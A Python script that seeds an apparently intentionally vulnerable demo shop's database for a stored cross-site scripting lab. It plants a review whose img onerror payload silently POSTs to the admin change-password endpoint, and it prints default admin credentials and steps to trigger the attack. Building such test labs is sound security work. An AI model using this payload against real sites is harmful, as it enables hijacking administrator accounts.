#!/usr/bin/env python3
"""
Seed the database with demo data including a malicious review for testing Stored XSS.
Run this script to populate the database with demo products and reviews.
"""

import sqlite3
import os
from datetime import datetime, timezone

DB_PATH = os.path.join(os.path.dirname(__file__), 'app.db')

def init_db():
    """Initialize database tables"""
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute('''
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT,
        role TEXT
    )
    ''')
    cur.execute('''
    CREATE TABLE IF NOT EXISTS products (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT,
        description TEXT
    )
    ''')
    cur.execute('''
    CREATE TABLE IF NOT EXISTS reviews (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        product_id INTEGER,
        author TEXT,
        content TEXT,
        created_at TEXT
    )
    ''')
    conn.commit()
    conn.close()

# Initialize database first
init_db()

conn = sqlite3.connect(DB_PATH)
conn.row_factory = sqlite3.Row
cur = conn.cursor()

# Add a test product if it doesn't exist
cur.execute('SELECT COUNT(*) as c FROM products WHERE name = "Test Shoe"')
if cur.fetchone()['c'] == 0:
    cur.execute(
        'INSERT INTO products (name, description) VALUES (?, ?)',
        ('Test Shoe', 'A great shoe for testing reviews and vulnerabilities')
    )
    print("✓ Added test product")

# Check the product ID
cur.execute('SELECT id FROM products WHERE name = "Test Shoe"')
product = cur.fetchone()
if product:
    product_id = product['id']
    
    # Add a normal review
    cur.execute('SELECT COUNT(*) FROM reviews WHERE author = "alice" AND product_id = ?', (product_id,))
    if cur.fetchone()[0] == 0:
        cur.execute(
            'INSERT INTO reviews (product_id, author, content, created_at) VALUES (?, ?, ?, ?)',
            (product_id, 'alice', 'Great shoes! Very comfortable and stylish.', datetime.now(timezone.utc).isoformat())
        )
        print("✓ Added normal review from alice")
    
    # Add a malicious review with XSS payload
    xss_payload = '<img src=x onerror="fetch(\'/admin/change-password\', {method:\'POST\', body: new FormData(new DOMParser().parseFromString(\'<form><input name=new_password value=hacked123></form>\', \'text/html\').querySelector(\'form\'))}).then(() => alert(\'Admin password changed to hacked123\'))">'
    
    cur.execute('SELECT COUNT(*) FROM reviews WHERE content LIKE ?', ('%onerror%',))
    if cur.fetchone()[0] == 0:
        cur.execute(
            'INSERT INTO reviews (product_id, author, content, created_at) VALUES (?, ?, ?, ?)',
            (product_id, 'alice', xss_payload, datetime.now(timezone.utc).isoformat())
        )
        print("✓ Added XSS malicious review (will execute in admin panel)")

conn.commit()
conn.close()

print("\nDatabase seeded successfully!")
print("\nTo test the Stored XSS vulnerability:")
print("1. Start the backend: uvicorn main:app --reload")
print("2. Login as admin (admin / admin123)")
print("3. Navigate to /admin/reviews")
print("4. The XSS payload will execute and try to change the admin password")
print("\nNote: This only works when SECURE_MODE = False in main.py")
